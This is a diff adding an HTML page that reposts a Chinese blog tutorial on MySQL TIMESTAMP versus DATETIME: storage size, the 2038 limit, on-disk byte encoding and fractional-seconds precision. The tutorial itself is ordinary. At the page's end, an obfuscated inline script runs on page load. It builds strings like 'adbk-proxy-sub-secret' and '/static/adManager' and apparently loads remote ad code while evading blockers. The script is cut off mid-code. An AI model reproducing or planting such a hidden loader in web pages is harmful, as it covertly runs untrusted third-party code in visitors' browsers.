@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>设计-mysql的Timestamp和Datetime的字节占用之争 - 编程随想</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="设计-mysql的Timestamp和Datetime的字节占用之争" />
+<meta property="og:description" content="【缘起】 众所周知，在进行数据库设计的时候，关于存储到秒级的时间类型字段，常用的有Timestamp和Datetime这2种。而这2种类型的字段，在存储格式以及存储空间上，又有着很大的不同，列举如下：
+那么，在实际的数据库设计中，在Timestamp和Datetime这2种秒级别的时间列类型中，如何进行选择呢？让我们看下面示例。
+【行为差别】 为了方便对Timestamp和Datetime这2种列类型的数据存储行为进行研究，我们创建如下t_timestamp_demo测试表。
+其中，my_date为DATETIME日期类型的列字段；create_time在新增数据时，自动将当前系统时区的时间戳，赋值给该列字段；update_time列字段，会在新增数据和当前行数据发生修改时，自动更新为当前系统时区的时间(戳)。
+下面，我们插入一条数据：
+如上图，通过只向my_data字段插入指定时间字符串&#39;2099-12-24 18:18:18&#39;后，该行数据的create_time和update_time字段，会自动插入为当前系统的时间(戳)（见上图右下角时间）。
+接下来，我们在修改一下该条数据，如下：
+如上图，经过对my_date字段进行修改后（修改其它字段也可），update_time字段就会自动更新为当前系统的最新时间(戳)，这是因为在update_time字段定义的时候，给了ON UPDATE CURRENT_TIMESTAMP的列特性。
+【存储限制】 接下来我们看下，Timestamp类型的字段，所能够存储的时间范围的上限和下限分别是什么，如下：
+如上图，我们修改了update_time的时间为&#39;2038-01-19 11:14:07&#39;，这是阿K在本地环境中能够向Timestamp类型的列字段，插入的最大的值。
+接下来，我们再多加1秒，即将update_time列字段的时间，修改为&#39;2038-01-19 11:14:08&#39;，如下：
+如上图，我们看到Mysql会报错，说&#39;2038-01-19 11:14:08&#39;这个时间值，在update_time列字段的存储是不正确的，也就是说&#39;2038-01-19 11:14:07&#39;，是Timestamp类型的字段所能存储的最大值了，那么为什么会是&#39;2038-01-19 11:14:07&#39;呢？
+让我们先看一下Mysql中，整数类型的存储和范围，如下：
+其中，Int类型占用4个字节的空间，其有符号的存储范围为：-2147483648 ~ 2147483647。那么我们知道Timestamp类型的字段，也是占用4个字节的存储空间，那么，我们将&#39;2038-01-19 11:14:07&#39;换算成时间戳，如下：
+如上图，将&#39;2038-01-19 11:14:07&#39;换算成时间戳后，就是2147483647。这正好是Mysql中Int类型字段所能存储的最大值了，多1秒就会超出Int类型的存储空间大小，溢出报错。
+那么Timestamp类型的字段，所能存储的时间最小值，又是多少呢？让我们继续往下看：
+如上图，我们将update_time字段修改为&#39;1970-01-01 08:00:01&#39;，这是阿K在本地环境所能存储的Timestamp列类型字段的最小值了。
+再减1秒，就会报错，如下：
+如上图，我们看到&#39;1970-01-01 08:00:00&#39;这个时间值，在Mysql的Timestamp类型的列字段update_time中，存储是会报错的。也就是说，Timestamp类型的列字段，所能存储的最小时间是&#39;1970-01-01 08:00:01&#39;，换算成时间戳，如下：
+如上图，由此可见，Timestamp类型的列字段，能存储的时间戳范围，就是有符号Int类型字段的1 ~ 2147483647，因为Timestamp列类型字段，只能存储0以上的时间戳数值。如果是unsigned无符号整数，则可以存储的时间戳值为4294967295，也就是能存储到2106年，如下：
+如上图，这可比有符号的Int类型整数，所表示的最大时间戳2147483647(即2038年)，能多存68年呢。可惜目前Timestamp类型的列字段，只能存储到2147483647（2038年1月19日 11点14分07秒）。
+【深究】 上面我们分析了Timestamp和Datetime在数据库表中的存储行为和大小限制。那么，Timestamp和Datetime究竟是如何存储在数据库表里面的呢？下面通过一个示例，来看看Timestamp和Datetime类型的字段，在磁盘上面的表空间中，是如何存储的吧。
+如上图，我们创建了2个表，t_one_datetime用来存储Datetime类型的数据，字段名为my_datetime。t_one_timestamp用来存储Timestamp类型的字段，字段名为my_timestamp。
+接下来，我们在这2个表中，分别插入1条数据，如下：
+接下来，我们找到磁盘上表t_one_datetime和表t_one_timestamp的表空间文件(后缀名是.ibd)，打开进行对比，如下：
+t_one_datetime表空间_元数据
+t_one_timestamp表空间_元数据
+从上图的元数据文件中，我们看到t_one_datetime表中，存储的是：a7 af 32 c8 ee，这5个字节的数据。而t_one_timestamp表中，存储的是：5f 90 fb 4f，这4个字节的数据。
+那么这些数据到底代表着什么意思呢？让我们先将t_one_timestamp里面存储的数据，即：5f 90 fb 4f，转换为十进制数字，如下：
+得到十进制数字为:1603337039，将其进行时间戳计算，如下：
+这正好就是我们t_one_timestamp表中，my_timestamp字段存储的时间&#39;2020-10-22 11:23:59&#39;。由此可见，Timestamp类型的列字段，确实是以4字节的时间戳整数的方式存储在表空间里的。
+那么t_one_datetime中，数据：a7 af 32 c8 ee，这5个字节存储的是什么东西呢？让我们先看下Mysql官网上对Datetime类型的解释，如下：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/b0b9c64d178216a1f3baa959f617ee7a/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-11T22:55:38+08:00" />
+<meta property="article:modified_time" content="2023-12-11T22:55:38+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程随想" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程随想</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">设计-mysql的Timestamp和Datetime的字节占用之争</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <h5>【缘起】</h5> 
+<p>众所周知，在进行数据库设计的时候，关于存储到秒级的时间类型字段，常用的有Timestamp和Datetime这2种。而这2种类型的字段，在存储格式以及存储空间上，又有着很大的不同，列举如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="190" src="https://images2.imgbox.com/c6/e7/IEKYkJcp_o.png" width="605"></p> 
+<p>那么，在实际的数据库设计中，在Timestamp和Datetime这2种秒级别的时间列类型中，如何进行选择呢？让我们看下面示例。</p> 
+<h5>【行为差别】</h5> 
+<p>为了方便对Timestamp和Datetime这2种列类型的数据存储行为进行研究，我们创建如下t_timestamp_demo测试表。</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="177" src="https://images2.imgbox.com/18/f2/AUJW7fSb_o.png" width="1149"></p> 
+<p>其中，my_date为DATETIME日期类型的列字段；create_time在新增数据时，自动将当前系统时区的时间戳，赋值给该列字段；update_time列字段，会在新增数据和当前行数据发生修改时，自动更新为当前系统时区的时间(戳)。</p> 
+<p>下面，我们插入一条数据：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="538" src="https://images2.imgbox.com/c4/bb/hs1mTzG3_o.png" width="1169"></p> 
+<p>如上图，通过只向my_data字段插入指定时间字符串'2099-12-24 18:18:18'后，该行数据的create_time和update_time字段，会自动插入为当前系统的时间(戳)（见上图右下角时间）。</p> 
+<p>接下来，我们在修改一下该条数据，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="597" src="https://images2.imgbox.com/1a/8d/9nXeJz0Y_o.png" width="1168"></p> 
+<p>如上图，经过对my_date字段进行修改后（修改其它字段也可），update_time字段就会自动更新为当前系统的最新时间(戳)，这是因为在update_time字段定义的时候，给了ON UPDATE CURRENT_TIMESTAMP的列特性。</p> 
+<h5>【存储限制】</h5> 
+<p>接下来我们看下，Timestamp类型的字段，所能够存储的时间范围的上限和下限分别是什么，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="487" src="https://images2.imgbox.com/aa/63/5VqI1dSi_o.png" width="1017"></p> 
+<p>如上图，我们修改了update_time的时间为'2038-01-19 11:14:07'，这是阿K在本地环境中能够向Timestamp类型的列字段，插入的最大的值。</p> 
+<p>接下来，我们再多加1秒，即将update_time列字段的时间，修改为'2038-01-19 11:14:08'，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="611" src="https://images2.imgbox.com/01/c0/G19YX4OM_o.png" width="1017"></p> 
+<p>如上图，我们看到Mysql会报错，说'2038-01-19 11:14:08'这个时间值，在update_time列字段的存储是不正确的，也就是说'2038-01-19 11:14:07'，是Timestamp类型的字段所能存储的最大值了，那么为什么会是'2038-01-19 11:14:07'呢？</p> 
+<p>让我们先看一下Mysql中，整数类型的存储和范围，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="343" src="https://images2.imgbox.com/94/56/HVA9cJf2_o.png" width="647"></p> 
+<p>其中，Int类型占用4个字节的空间，其有符号的存储范围为：-2147483648 ~ 2147483647。那么我们知道Timestamp类型的字段，也是占用4个字节的存储空间，那么，我们将'2038-01-19 11:14:07'换算成时间戳，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="80" src="https://images2.imgbox.com/bc/88/HWLo6x4Z_o.png" width="819"></p> 
+<p>如上图，将'2038-01-19 11:14:07'换算成时间戳后，就是2147483647。这正好是Mysql中Int类型字段所能存储的最大值了，多1秒就会超出Int类型的存储空间大小，溢出报错。</p> 
+<p>那么Timestamp类型的字段，所能存储的时间最小值，又是多少呢？让我们继续往下看：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="515" src="https://images2.imgbox.com/c0/75/g6LL0V5n_o.png" width="1034"></p> 
+<p>如上图，我们将update_time字段修改为'1970-01-01 08:00:01'，这是阿K在本地环境所能存储的Timestamp列类型字段的最小值了。</p> 
+<p>再减1秒，就会报错，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="500" src="https://images2.imgbox.com/9d/2d/g2TmErcy_o.png" width="803"></p> 
+<p>如上图，我们看到'1970-01-01 08:00:00'这个时间值，在Mysql的Timestamp类型的列字段update_time中，存储是会报错的。也就是说，Timestamp类型的列字段，所能存储的最小时间是'1970-01-01 08:00:01'，换算成时间戳，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="104" src="https://images2.imgbox.com/8d/fa/kke5USii_o.png" width="885"></p> 
+<p>如上图，由此可见，Timestamp类型的列字段，能存储的时间戳范围，就是有符号Int类型字段的1 ~ 2147483647，因为Timestamp列类型字段，只能存储0以上的时间戳数值。如果是unsigned无符号整数，则可以存储的时间戳值为4294967295，也就是能存储到2106年，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="73" src="https://images2.imgbox.com/19/7c/pqQ9fDQ6_o.png" width="783"></p> 
+<p>如上图，这可比有符号的Int类型整数，所表示的最大时间戳2147483647(即2038年)，能多存68年呢。可惜目前Timestamp类型的列字段，只能存储到2147483647（2038年1月19日 11点14分07秒）。</p> 
+<h5>【深究】</h5> 
+<p>上面我们分析了Timestamp和Datetime在数据库表中的存储行为和大小限制。那么，Timestamp和Datetime究竟是如何存储在数据库表里面的呢？下面通过一个示例，来看看Timestamp和Datetime类型的字段，在磁盘上面的表空间中，是如何存储的吧。</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="237" src="https://images2.imgbox.com/3e/68/ARq3jbRY_o.png" width="366"></p> 
+<p>如上图，我们创建了2个表，t_one_datetime用来存储Datetime类型的数据，字段名为my_datetime。t_one_timestamp用来存储Timestamp类型的字段，字段名为my_timestamp。</p> 
+<p>接下来，我们在这2个表中，分别插入1条数据，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="567" src="https://images2.imgbox.com/7c/77/vJPBIyt6_o.png" width="1171"></p> 
+<p>接下来，我们找到磁盘上表t_one_datetime和表t_one_timestamp的表空间文件(后缀名是.ibd)，打开进行对比，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="346" src="https://images2.imgbox.com/8e/02/0l0qQeFY_o.png" width="596"></p> 
+<p>t_one_datetime表空间_元数据</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="323" src="https://images2.imgbox.com/b3/18/192aVI0t_o.png" width="593"></p> 
+<p>t_one_timestamp表空间_元数据</p> 
+<p>从上图的元数据文件中，我们看到t_one_datetime表中，存储的是：a7 af 32 c8 ee，这5个字节的数据。而t_one_timestamp表中，存储的是：5f 90 fb 4f，这4个字节的数据。</p> 
+<p>那么这些数据到底代表着什么意思呢？让我们先将t_one_timestamp里面存储的数据，即：5f 90 fb 4f，转换为十进制数字，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="233" src="https://images2.imgbox.com/65/c4/HUIQfv39_o.png" width="318"></p> 
+<p>得到十进制数字为:1603337039，将其进行时间戳计算，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="83" src="https://images2.imgbox.com/73/3a/Cy5JKNz6_o.png" width="792"></p> 
+<p>这正好就是我们t_one_timestamp表中，my_timestamp字段存储的时间'2020-10-22 11:23:59'。由此可见，Timestamp类型的列字段，确实是以4字节的时间戳整数的方式存储在表空间里的。</p> 
+<p>那么t_one_datetime中，数据：a7 af 32 c8 ee，这5个字节存储的是什么东西呢？让我们先看下Mysql官网上对Datetime类型的解释，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="355" src="https://images2.imgbox.com/75/a7/jvGYeAHp_o.png" width="652"></p> 
+<p>这里我们看到，从MySQL 5.6.4开始，Datetime的存储空间变成了5个字节了(准确的说应该是5字节+0~3个字节的FSP分秒精度），那么我们这里的5个字节数据：a7 af 32 c8 ee，是如何存储的呢？我们看官网的解释，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="242" src="https://images2.imgbox.com/2c/52/eLPu6bcz_o.png" width="562"></p> 
+<p>如上图，按照官网的解释，Datetime的5个字节，总共是40个bit。将我们的数据：a7 af 32 c8 ee，转换为比特，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="246" src="https://images2.imgbox.com/89/80/ejUmSRhi_o.png" width="370"></p> 
+<p>得到40位bit，为：1010 0111 1010 1111 0011 0010 1100 1000 1110 1110，将其按照上面官网的Datetime解释，进行位对齐后，排列如下：</p> 
+<p>1 01001111010111100 11001 01100 100011 101110</p> 
+<p>转换为表格表示，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="236" src="https://images2.imgbox.com/16/d9/3QFNyWBz_o.png" width="605"></p> 
+<p>上面表格中，我们的数据经过位拆分，分别计算后，得到的时间就是'3125年11月25日 12点35分46秒'，也就是t_one_datetime表中，my_datetime字段所存储的Datetime类型的数据'3125-11-25 12：35：46'。</p> 
+<p>这里我要重点说明下，为什么年的存储，要采用"年*13 + 月"的方式进行存储呢？</p> 
+<p>假设我们本次要存储的时间为'9999年12月'，如果按照"年月"的格式进行存储，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="243" src="https://images2.imgbox.com/92/3d/3jDS0vtH_o.png" width="369"></p> 
+<p>我们看到，按照"年月"的方式进行'9999-12'的存储，共占用了20个bit的空间，也就是2.5个字节(1个字节8bit)。</p> 
+<p>那么如果按照"年*13+月"的方式进行存储，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="249" src="https://images2.imgbox.com/82/93/k7zGPEhJ_o.png" width="374"></p> 
+<p>如上图，通过"年*13+月"的计算存储之后，只占用了17个bit的存储空间(前面000不计算在空间内)，这样就节省了3个bit的空间，使得'9999-12-31 23:59:59'这样的时间范围，可以有效存储在5个字节中，Datetime这样的存储方式，只比Timestamp列类型的字段多占用了1个字节的存储空间，就能存储下足够大的时间范围了。</p> 
+<h5>【FSP】</h5> 
+<p>根据MySQL的官方文档，我们知道在5.6.4的版本开始，Timestamp和Datetime列类型的字段，在原有所占字节空间的基础上，都加入了1个叫做FSP(fractional-seconds precision)的分秒精度的扩展存储，如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="365" src="https://images2.imgbox.com/22/3e/qflPy1d9_o.png" width="682"></p> 
+<p>这个分秒精度FSP的设计，主要是为保存毫秒值需求的时间字段而设计的，也就是说，自MySQL 5.6.4开始，我们开始存储时间，精确到秒后面的6位小数了。</p> 
+<p>看下面这个例子：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="337" src="https://images2.imgbox.com/cd/97/MDYkNczN_o.png" width="873"></p> 
+<p>如上图，自MySQL 5.6.4开始，只要在Timestamp和Datetime列类型的字段后面，加上表示FSP(分秒精度)的小数点位数长度值，就可以存储时间秒后面为0~6位长度的毫秒时间了，上例中t_fsp_datetime表中，my_datetime字段的FSP长度值为6，所以就能插入，表示时间秒后6位长度的小数时间'2019-01-09 12:03:15.666999'。</p> 
+<p>那么这个FSP的位数的长短，分别会占用多少存储空间呢？官网的解释如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="275" src="https://images2.imgbox.com/c4/71/IMn3f5Ib_o.png" width="638"></p> 
+<p>可见，指定不同FSP的位数长度，所占用的存储空间，分别从0-3个字节不等。</p> 
+<h5>【总结】</h5> 
+<p>本篇主要针对MySQL数据库设计中，Timestamp和Datetime这2个字段类型，进行了对比和分析。</p> 
+<p>从存储限制上来说，虽然Datetime字段类型多占用了1些存储空间，但是却可以存储足够大的时间范围，适应性和可控性都Timestamp要强。</p> 
+<p>然而Timestamp字段类型的存储，几乎就等于是Int(有符号)类型的存储。这种情况下，如果有时间戳的存储需求，完全可以使用Unsigned Int(无符号Int)或者Bigint类型来进行时间戳的存储处理，这样它不但可以充分利用Int类型的存储空间来存储更长的时间，同时也能够进行插入赋于CURRENT_TIMESTAMP的能力，从而弥补Timestamp字段类型的不足。</p> 
+<p>从存储行为上来说，Timestamp的自动插入能力，Datetime也是支持的，所以Timestamp的额外亮点，就是在于具备自动更新的能力。但是这个能力，还要看设计者的评估，是否适合放在MySQL数据库这里进行更新。</p> 
+<p>因为在很多分布式的场景中，MySQL数据库往往与JAVA服务系统，不在同一个服务器节点上，那么可能存在MySQL的时间和JAVA服务系统的时间，没有进行NTP时间同步。而有的设计者认为，MySQL就应该只是负责单纯存储的地方，而时间戳的确认和计算，都应该交由服务系统来进行统一控制管理，这样就不会造成MySQL时间与服务系统时间不同步，造成的时间戳自动更新错乱的问题了。</p> 
+<p>在实际的数据库设计开发中，每位设计者的观点和想法都不尽相同，都有自己的设计考量。所谓萝卜白菜，各有所爱，关于Timestamp和Datetime的设计选择，作为开发人员的您，又是如何思考和决定的呢？</p> 
+<p>欢迎留言与阿K进行交流讨论，希望本篇文章对您有所帮助，谢谢！</p> 
+<h5>【示例】</h5> 
+<p>本文中提到的MySQL的示例文件，在阿K的Gitee中都可以找到，如下：</p> 
+<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgitee.com%2FKival%2Fmysql-work-demo" rel="nofollow" title="https://gitee.com/Kival/mysql-work-demo">https://gitee.com/Kival/mysql-work-demo</a></p> 
+<p>【后记】</p> 
+<p>关于Datetime在MySQL 5.6.4之前的版本中，占用8个字节的存储空间的计算方式，官方解释如下：</p> 
+<p></p> 
+<p class="img-center"><img alt="img" height="262" src="https://images2.imgbox.com/76/2e/rYAmuV2y_o.png" width="886"></p> 
+<p>简单来说，就是用了2个Int类型的4字节空间，来存储时间数据。如：3018-12-20 15:17:55，存储的实际数据就是'30181220 151755'，这样的2段4字节的Int类型空间。所以就有了大家普遍认知的MySQL中，Datetime比Timestamp的字段类型，多占用1倍(4字节)的存储空间的说法了。</p> 
+<p>【特别鸣谢】</p> 
+<p><a href="https://www.jianshu.com/u/a1e2180d3f8a" rel="nofollow" title="jeremyCai">jeremyCai</a></p> 
+<p>特别感谢以上各位朋友，对本文中的错误和用词不当，做出的指点批评。只有你们的批评指正，才能激发阿K的不断学习与进步，谢谢！</p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/e3474a7aa81e4ad48d23a83a81c97249/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">PostGIS学习教程十三：几何图形创建函数</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/0b3cf569113eb91e3067b2fa2bc1946b/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Golang 使用 Template 引擎构建漂亮的邮件内容并且完成邮件发送</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程随想.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return 